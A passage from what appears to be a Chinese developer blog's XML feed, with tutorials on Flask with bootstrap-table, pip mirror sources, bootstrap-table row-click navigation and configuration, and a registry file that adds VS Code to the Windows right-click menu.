render_template(&quot;table.html&quot;,</span><br><span class="line">      data&#x3D;data,</span><br><span class="line">      columns&#x3D;columns,</span><br><span class="line">      title&#x3D;&#39;Flask Bootstrap Table&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">#print jdata</span><br><span class="line">  app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure><p>table.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;robots&quot; content&#x3D;&quot;noindex&quot;&gt;</span><br><span class="line">  &lt;title&gt;Bootstrap Table - Flask example &lt;&#x2F;title&gt;</span><br><span class="line">  &lt;script</span><br><span class="line">  src&#x3D;&quot;jquery-2.2.4.min.js&quot;</span><br><span class="line">  integrity&#x3D;&quot;sha256-BbhdlvQf&#x2F;xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44&#x3D;&quot;</span><br><span class="line">  crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;bootstrap.min.css&quot;&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;bootstrap-table.min.css&quot;&gt;</span><br><span class="line">  &lt;script type&#x3D;&#39;text&#x2F;javascript&#39; src&#x3D;&quot;bootstrap-table.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;style type&#x3D;&#39;text&#x2F;css&#39;&gt;</span><br><span class="line">    .row-index &#123;</span><br><span class="line">      width: 50px;</span><br><span class="line">      display: inline-block;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;</span><br><span class="line">    $(window).load(function()&#123;</span><br><span class="line">      var data &#x3D; &#123;&#123; data|tojson &#125;&#125;;</span><br><span class="line">      var columns &#x3D; &#123;&#123;columns|tojson&#125;&#125;;</span><br><span class="line"></span><br><span class="line">      $(function() &#123;</span><br><span class="line">        $(&#39;#table&#39;).bootstrapTable(&#123; </span><br><span class="line">          data: data,</span><br><span class="line">          columns: columns,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;container&quot; style&#x3D;&quot;padding: 10px; &quot;&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123;title&#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;br&#x2F;&gt;</span><br><span class="line">    &lt;!-- &lt;div id&#x3D;&quot;toolbar&quot;&gt;&lt;&#x2F;div&gt; --&gt;</span><br><span class="line">    &lt;table</span><br><span class="line">      id&#x3D;&quot;table&quot;</span><br><span class="line">      data-toggle&#x3D;&quot;true&quot;</span><br><span class="line">      data-toolbar&#x3D;&quot;#toolbar&quot;</span><br><span class="line">      data-search&#x3D;&quot;true&quot;</span><br><span class="line">      data-show-columns&#x3D;&quot;true&quot;</span><br><span class="line">      data-pagination&#x3D;&quot;true&quot;</span><br><span class="line">      data-height&#x3D;&quot;500&quot;&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010209.png" alt="flask_bootstrap_table"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> web </tag>
            
            <tag> bootstrap-table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_pip下载不下来或者网速慢解决方案</title>
      <link href="2020/04/20/2020-04-20-Python_pip_cannot_download_or_slowspeed/"/>
      <url>2020/04/20/2020-04-20-Python_pip_cannot_download_or_slowspeed/</url>
      
        <content type="html"><![CDATA[<p>解决方案：</p><p>pip install xxxxxxx -i <a href="http://pypi.douban.com/simple">http://pypi.douban.com/simple</a> –trusted-host pypi.douban.com</p><p>原因：可能资源在国外服务器，导致下载不下来，加上豆瓣，表示去豆瓣源上下载，较国外网址快一些</p><p>其他源地址：</p><p>1)<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> 阿里云</p><p>2)<a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a>  中国科技大学</p><ol start="3"><li><p><a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a>  豆瓣</p></li><li><p><a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a> 清华大学</p></li><li><p> <a href="http://pypi.mirrors.ustc.edu.cn/simple/">http://pypi.mirrors.ustc.edu.cn/simple/</a> 中国科学技术大学</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootstrap-table 点击表格某一行内容跳转到该行内容的详情页</title>
      <link href="2020/04/20/2020-04-20-bootstrap-table_click_on_row_to%20jump_to_detail_page/"/>
      <url>2020/04/20/2020-04-20-bootstrap-table_click_on_row_to%20jump_to_detail_page/</url>
      
        <content type="html"><![CDATA[<h2 id="bootstrap-table点击表格某一行内容跳转到该行内容的详情页"><a href="#bootstrap-table点击表格某一行内容跳转到该行内容的详情页" class="headerlink" title="bootstrap-table点击表格某一行内容跳转到该行内容的详情页"></a>bootstrap-table点击表格某一行内容跳转到该行内容的详情页</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(&#39;#table&#39;).bootstrapTable(&#123;</span><br><span class="line">            method: &#39;get&#39;,</span><br><span class="line">            striped: true,</span><br><span class="line">            pagination: true,</span><br><span class="line">            singleSelect:true,</span><br><span class="line">            dataType: &#39;json&#39;,</span><br><span class="line">            pageNumber: 1,                       &#x2F;&#x2F;初始化加载第一页，默认第一页</span><br><span class="line">            pageSize: 10, &#x2F;&#x2F;每页的记录行数</span><br><span class="line">            onClickRow:function(row, $element) &#123;</span><br><span class="line">               window.location.href&#x3D; &#39;&#x2F;news&#x2F;&#39;+row.hash</span><br><span class="line">            &#125;,</span><br><span class="line">            columns: columns</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onClickRow:function(row, $element) &#123;</span><br><span class="line">    &#x2F;&#x2F;这里的row参数就是点击某行获取的行对象，可以row.id,row.name,row.price等等这样获取行内的数据</span><br><span class="line">    alert(row.id)</span><br><span class="line">    &#x2F;&#x2F;这里是跳转页面，把参数带到后面就行，如果有多个就用&amp;把参数隔开就可以</span><br><span class="line">    window.location.href&#x3D;&quot;index.html?id&#x3D;&quot; + row.id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bootstrap-table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCODE添加右键打开文件夹功能</title>
      <link href="2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/"/>
      <url>2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/</url>
      
        <content type="html"><![CDATA[<p>问题描述<br>由于之前在安装VSCODE的时候，漏选了以下功能</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20190304095855861.png" alt="20190304095855861"></p><p>导致打开项目，需要先打开VSCODE，再打开文件夹。</p><p>可以后期修改注册表实现添加右键vscode打开文件夹功能。</p><p>新建文本，将以下代码写入文本，并修改文件名为Open File With VS code.reg。里面的vscode的路径要是你自己本机的vscode的路径，要记得改。运行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%1\&quot;&quot;</span><br><span class="line">    </span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/8140656-373ca45acfaf8b68.png" alt="8140656-373ca45acfaf8b68"></p><p>点击确定，即可右键添加vscode打开文件夹。<br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vscode_open_folder.png" alt="vscode_open_folder"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootstrap-table 详解</title>
      <link href="2020/04/19/2020-04-19-bootstrap-table_detailed_introduction/"/>
      <url>2020/04/19/2020-04-19-bootstrap-table_detailed_introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="bootstrap-table-详解"><a href="#bootstrap-table-详解" class="headerlink" title="bootstrap-table 详解"></a>bootstrap-table 详解</h2><h3 id="1、下载："><a href="#1、下载：" class="headerlink" title="1、下载："></a>1、下载：</h3><p><a href="https://github.com/wenzhixin/bootstrap-table">https://github.com/wenzhixin/bootstrap-table</a></p><h3 id="2、文档："><a href="#2、文档：" class="headerlink" title="2、文档："></a>2、文档：</h3><p><a href="http://bootstrap-table.wenzhixin.net.cn/zh-cn/documentation/">http://bootstrap-table.wenzhixin.net.cn/zh-cn/documentation/</a></p><p>示例：<a href="https://examples.bootstrap-table.com/">https://examples.bootstrap-table.com/</a></p><p><a href="https://bootstrap-table.com/docs/api/table-options/">https://bootstrap-table.com/docs/api/table-options/</a></p><p>有什么问题在官网上搜索基本都能解决。</p><p>推荐一个非常好用的各种样例示范中文网站，Bootstrap表格插件Bootstrap Table配置教程：<a href="http://www.itxst.com/Bootstrap-Table/QuickStart.html">http://www.itxst.com/Bootstrap-Table/QuickStart.html</a></p><h3 id="3、引用："><a href="#3、引用：" class="headerlink" title="3、引用："></a>3、引用：</h3><pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap-table.css&quot;&gt;&lt;script src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;bootstrap-table.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;bootstrap-table-zh-CN.js&quot;&gt;&lt;/script&gt;</code></pre><h3 id="4、基本用法："><a href="#4、基本用法：" class="headerlink" title="4、基本用法："></a>4、基本用法：</h3><p>html里，只需要一句代码就解决了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;table&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js里：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#table&#x27;</span>).bootstrapTable(&#123;</span><br><span class="line">            columns: [&#123;</span><br><span class="line">                field: <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">                title: <span class="string">&#x27;Item ID&#x27;</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                field: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">                title: <span class="string">&#x27;Item Name&#x27;</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                field: <span class="string">&#x27;price&#x27;</span>,</span><br><span class="line">                title: <span class="string">&#x27;Item Price&#x27;</span></span><br><span class="line">            &#125;],</span><br><span class="line">            data: [&#123;</span><br><span class="line">                id: <span class="number">1</span>,</span><br><span class="line">                name: <span class="string">&#x27;Item 1&#x27;</span>,</span><br><span class="line">                price: <span class="string">&#x27;$1&#x27;</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                id: <span class="number">2</span>,</span><br><span class="line">                name: <span class="string">&#x27;Item 2&#x27;</span>,</span><br><span class="line">                price: <span class="string">&#x27;$2&#x27;</span></span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>这个data也可以换成url：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#table&#x27;</span>).bootstrapTable(&#123;</span><br><span class="line">    url: <span class="string">&#x27;data1.json&#x27;</span>,</span><br><span class="line">    columns: [&#123;</span><br><span class="line">        field: <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">        title: <span class="string">&#x27;Item ID&#x27;</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        field: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">        title: <span class="string">&#x27;Item Name&#x27;</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        field: <span class="string">&#x27;price&#x27;</span>,</span><br><span class="line">        title: <span class="string">&#x27;Item Price&#x27;</span></span><br><span class="line">    &#125;, ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：url和data的区别是：url是异步请求远程数据；data是直接把数据赋值给他。</p><h3 id="5、定制组件"><a href="#5、定制组件" class="headerlink" title="5、定制组件"></a>5、定制组件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(function () &#123;</span><br><span class="line">    function init(table,url,params,titles,hasCheckbox,toolbar) &#123;</span><br><span class="line">        $(table).bootstrapTable(&#123;</span><br><span class="line">            url: url,                           &#x2F;&#x2F;请求后台的URL（*）</span><br><span class="line">            method: &#39;post&#39;,                     &#x2F;&#x2F;请求方式（*）</span><br><span class="line">            toolbar: toolbar,                   &#x2F;&#x2F;工具按钮用哪个容器</span><br><span class="line">            striped: true,                      &#x2F;&#x2F;是否显示行间隔色</span><br><span class="line">            cache: false,                       &#x2F;&#x2F;是否使用缓存，默认为true，所以一般情况下需要设置一下这个属性（*）</span><br><span class="line">            pagination: true,                   &#x2F;&#x2F;是否显示分页（*）</span><br><span class="line">            sortable: false,                    &#x2F;&#x2F;是否启用排序</span><br><span class="line">            sortOrder: &quot;asc&quot;,                   &#x2F;&#x2F;排序方式</span><br><span class="line">            queryParams: queryParams,           &#x2F;&#x2F;传递参数（*），这里应该返回一个object，即形如&#123;param1:val1,param2:val2&#125;</span><br><span class="line">            sidePagination: &quot;server&quot;,           &#x2F;&#x2F;分页方式：client客户端分页，server服务端分页（*）</span><br><span class="line">            pageNumber:1,                       &#x2F;&#x2F;初始化加载第一页，默认第一页</span><br><span class="line">            pageSize: 20,                       &#x2F;&#x2F;每页的记录行数（*）</span><br><span class="line">            pageList: [20, 50, 100],            &#x2F;&#x2F;可供选择的每页的行数（*）</span><br><span class="line">            search: true,                       &#x2F;&#x2F;是否显示表格搜索，此搜索是客户端搜索，不会进服务端，所以，个人感觉意义不大</span><br><span class="line">            strictSearch: true,</span><br><span class="line">            showColumns: true,                  &#x2F;&#x2F;是否显示所有的列</span><br><span class="line">            showRefresh: true,                  &#x2F;&#x2F;是否显示刷新按钮</span><br><span class="line">            minimumCountColumns: 2,             &#x2F;&#x2F;最少允许的列数</span><br><span class="line">            clickToSelect: true,                &#x2F;&#x2F;是否启用点击选中行</span><br><span class="line">            &#x2F;&#x2F;height: 500,                      &#x2F;&#x2F;行高，如果没有设置height属性，表格自动根据记录条数觉得表格高度</span><br><span class="line">            uniqueId: &quot;ID&quot;,                     &#x2F;&#x2F;每一行的唯一标识，一般为主键列</span><br><span class="line">            showToggle:true,                    &#x2F;&#x2F;是否显示详细视图和列表视图的切换按钮</span><br><span class="line">            cardView: false,                    &#x2F;&#x2F;是否显示详细视图</span><br><span class="line">            detailView: false,                  &#x2F;&#x2F;是否显示父子表</span><br><span class="line">            onDblClickRow: function (row) &#123;     </span><br><span class="line">              console.log(&quot;click:&quot; + row.playerName)</span><br><span class="line">              &#125;                                 &#x2F;&#x2F;双击事件，单击为onClickRow</span><br><span class="line">            columns: createCols(params,titles,hasCheckbox),</span><br><span class="line">            data: [&#123;</span><br><span class="line">                id: 1,</span><br><span class="line">                name: &#39;Item 1&#39;,</span><br><span class="line">                price: &#39;$1&#39;</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                name: &#39;Item 2&#39;,</span><br><span class="line">                price: &#39;$2&#39;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    function createCols(params,titles,hasCheckbox) &#123;</span><br><span class="line">        if(params.length!&#x3D;titles.length)</span><br><span class="line">            return null;</span><br><span class="line">        var arr &#x3D; [];</span><br><span class="line">        if(hasCheckbox)</span><br><span class="line">        &#123;</span><br><span class="line">            var objc &#x3D; &#123;&#125;;</span><br><span class="line">            objc.checkbox &#x3D; true;</span><br><span class="line">            arr.push(objc);</span><br><span class="line">        &#125;</span><br><span class="line">        for(var i &#x3D; 0;i&lt;params.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            var obj &#x3D; &#123;&#125;;</span><br><span class="line">            obj.field &#x3D; params[i];</span><br><span class="line">            obj.title &#x3D; titles[i];</span><br><span class="line">            arr.push(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;可发送给服务端的参数：limit-&gt;pageSize,offset-&gt;pageNumber,search-&gt;searchText,sort-&gt;sortName(字段),order-&gt;sortOrder(&#39;asc&#39;或&#39;desc&#39;)</span><br><span class="line">    function queryParams(params) &#123;</span><br><span class="line">        return &#123;   &#x2F;&#x2F;这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的</span><br><span class="line">            limit: params.limit,   &#x2F;&#x2F;页面大小</span><br><span class="line">            offset: params.offset  &#x2F;&#x2F;页码</span><br><span class="line">            &#x2F;&#x2F;name: $(&quot;#txt_name&quot;).val()&#x2F;&#x2F;关键字查询</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 传&#39;#table&#39;</span><br><span class="line">    createBootstrapTable &#x3D; function (table,url,params,titles,hasCheckbox,toolbar) &#123;</span><br><span class="line">        init(table,url,params,titles,hasCheckbox,toolbar);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（1）调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createBootstrapTable(&#39;#table&#39;,&#39;&#39;,[&#39;id&#39;,&#39;name&#39;,&#39;price&#39;],[&#39;Item ID&#39;,&#39;Item Name!&#39;,&#39;Item Price!&#39;],true,&#39;#toolbar&#39;);</span><br></pre></td></tr></table></figure><p>（2）模块：</p><p>注意，这些只要添加上一行代码就会自动显示的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pagination 显示分页</span><br><span class="line">search     搜索功能</span><br><span class="line">showColumns  控制显示哪些列的按钮</span><br><span class="line">showRefresh  刷新按钮</span><br><span class="line">showToggle   详细视图和列表视图切换按钮</span><br></pre></td></tr></table></figure><p>而有些需要定制，例如toolbar，只不过把这个菜单放到合适的位置，实现这些菜单的功能还需要我们自己去做。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010145.png" alt="459756-20151119161059390-397683124"></p><p>（3）sidePagination</p><p>这个是选择服务端或者客户端分页，客户端则填’client’，服务端则填’server’，他们的数据结构是不同的。</p><p>这是客户端分页的数据结构：</p><pre><code>[    &#123;        &quot;id&quot;: 0,        &quot;name&quot;: &quot;Item 0&quot;,        &quot;price&quot;: &quot;$0&quot;    &#125;,    &#123;        &quot;id&quot;: 1,        &quot;name&quot;: &quot;Item 1&quot;,        &quot;price&quot;: &quot;$1&quot;    &#125;,    &#123;        &quot;id&quot;: 2,        &quot;name&quot;: &quot;Item 2&quot;,        &quot;price&quot;: &quot;$2&quot;    &#125;]</code></pre><p>这是服务端分页的数据结构：</p><pre><code>&#123;    &quot;total&quot;: 200,    &quot;rows&quot;: [        &#123;            &quot;id&quot;: 0,            &quot;name&quot;: &quot;Item 0&quot;,            &quot;price&quot;: &quot;$0&quot;        &#125;,        &#123;            &quot;id&quot;: 1,            &quot;name&quot;: &quot;Item 1&quot;,            &quot;price&quot;: &quot;$1&quot;        &#125;,        &#123;            &quot;id&quot;: 2,            &quot;name&quot;: &quot;Item 2&quot;,            &quot;price&quot;: &quot;$2&quot;        &#125;    ]&#125;</code></pre><p>这是因为客户端来分页的话，他直接根据数据总量进行判断要分成多少页，而服务端的话就需要返回一个total给他，因为服务端返回给的数据是一个片段，他没办法根据这个片段来计算多少页。</p><p>注意：这里可以看到，服务端分页和客户端分页数据结构的层次是不同的。他接受哪种数据结构，取决于是否加这个参数：</p><p>sidePagination:’server’<br>（4）显示图片 等修改单元格样式</p><p>字段通常是一个地址，那么我们要显示图片，应该使用formatter，其他修改单元格样式的需求，如添加链接等，同样处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">                field: &#39;thumb_img&#39;,</span><br><span class="line">                title: &#39;主图&#39;,</span><br><span class="line">                align: &#39;center&#39;,</span><br><span class="line">                formatter:function (value,row,index) &#123;</span><br><span class="line">                    return &#39;&lt;img  src&#x3D;&#39;+value+&#39; width&#x3D;50 class&#x3D;&quot;img-rounded&quot; &gt;&#39;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>当然还有编辑、导入导出、筛选等功能可配置，需要引入对应的包，详细的可以看以下参考文章。</p><p>参考自：<a href="https://blog.csdn.net/wzj0808/article/details/59104035">https://blog.csdn.net/wzj0808/article/details/59104035</a></p><p><a href="https://www.cnblogs.com/landeanfen/p/4976838.html">https://www.cnblogs.com/landeanfen/p/4976838.html</a></p><p><a 